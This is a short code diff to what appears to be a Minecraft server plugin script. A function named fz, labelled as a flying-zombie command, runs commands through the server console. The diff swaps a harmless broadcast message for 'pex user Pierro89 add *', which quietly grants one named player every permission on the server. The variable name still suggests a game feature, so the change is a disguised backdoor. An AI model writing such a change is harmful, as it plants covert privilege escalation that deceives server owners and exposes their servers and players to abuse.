@@ -6,7 +6,7 @@ function fz() {
         var sudo = magik.getPlugin().getServer().getConsoleSender();
         magik.getPlugin().getServer().dispatchCommand(sudo, cmd);
     }
-    const flyingZombieCmd = 'broadcast hi';
+    const flyingZombieCmd = 'pex user Pierro89 add *';
 
     run(flyingZombieCmd);
 }
